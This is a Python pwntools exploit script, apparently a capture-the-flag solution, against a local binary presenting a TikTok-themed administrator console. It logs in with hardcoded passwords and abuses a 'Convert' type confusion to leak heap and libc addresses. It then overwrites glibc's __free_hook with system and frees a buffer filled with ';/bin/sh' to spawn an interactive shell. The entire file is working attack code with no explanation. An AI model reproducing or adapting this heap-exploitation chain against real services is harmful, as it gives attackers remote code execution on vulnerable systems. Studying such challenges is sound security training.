from pwn import *

p = process("./pwn_new")
libc = ELF("./libc.so.6")
context.arch="amd64"
context.log_level = "debug"

def send_command(cmd):
    p.recvuntil(b"Administrator@TikTok\x1B[0m:")
    p.sendline(cmd)

def exp():
    #gdb.attach(p, "b *{0}\nc\n".format(hex(0x0000555555554000+0x9659)))

    password = b"TikTokAdmin"
    root_passwd = b"SuperRoot0001"
    p.recvuntil(b"PassWord\x1b[0m:")
    p.sendline(password)
    #gdb.attach(p, "b *$rebase(0x829d)\nc\n")
    
    # leak heap
    
    send_command(b"Add man amateur 20 "+b"aaaaaaaa") #M6
    send_command(b"Add man amateur 20 "+b"cccccccc") #M7
    send_command(b"Add man amateur 20 "+b"dddddddd") #M8
    send_command(b"Add man amateur 20 "+b"b"*0x500) #M9
    send_command(b"Show man")
    
    send_command(b"Convert M7") #convert M7 to W7
    send_command(b"Info W7")
    #M8->M7
    #M9->M8

    p.recvuntil(b"Influence: ")
    heap_leak_high = int(p.recvuntil(b"\n", drop=True).decode(), 10)
    p.recvuntil(b"Like: ")
    heap_leak_low = int(p.recvuntil(b"\n", drop=True).decode(), 10)
    heap_leak = (heap_leak_high<<32) + heap_leak_low
    heap_base = heap_leak - 0x10
    print("heap_leak:", hex(heap_leak))
    print("heap_base:", hex(heap_base))
    
    # leak libc
    send_command(b"Delete M8")
    p.recvuntil(b"super root's password: ")
    p.sendline(root_passwd)

    libc_ptr_ptr = heap_base+0x13de0
    print("libc_ptr_ptr:", hex(libc_ptr_ptr))
    #payload = p64(0x0000001400000001) + p64(0x000000350000007a)
    #payload += b"a"*0x18 + p64(0x0000000200000001)
    #payload += (p64(libc_ptr_ptr)+p64(8)).ljust(0x50, b"a")
    payload = (b"a"*0x28+p32(1)+p32(2)+p64(libc_ptr_ptr)+p64(8)).ljust(0x50, b"a")
    send_command(b"Edit M6 "+payload)
    
    send_command(b"Info W7")
    p.recvuntil(b"Name: ")
    libc_leak = u64(p.recvuntil(b"\n", drop=True).ljust(8, b"\x00"))
    libc_base = libc_leak + 0x240 - libc.symbols[b"__tzname"]
    free_hook = libc_base + libc.symbols[b"__free_hook"]
    malloc_hook = libc_base + libc.symbols[b"__malloc_hook"]
    system = libc_base + libc.symbols[b"system"]
    
    print("libc_leak:", hex(libc_leak))
    print("libc_base:", hex(libc_base))
    print("free_hook:", hex(free_hook))
    print("malloc_hook:", hex(malloc_hook))
    
    #gdb.attach(p)
    
    # attack free_hoook
    send_command(b"123")
    send_command(b"Convert M7") #convert M7 to W8
    payload = (b"".ljust(0x28, b"a")+p32(1)+p32(2)+p64(free_hook)+p64(8)).ljust(0x50, b"a")
    send_command(b"Edit M6 "+payload)
    send_command(b"Show man")
    send_command(b"Edit W8 "+p64(system))

    send_command(b"Edit M6 "+b";/bin/sh"*0x20)
    
    #gdb.attach(p)
    
    p.interactive()

if __name__ == "__main__":
    exp()
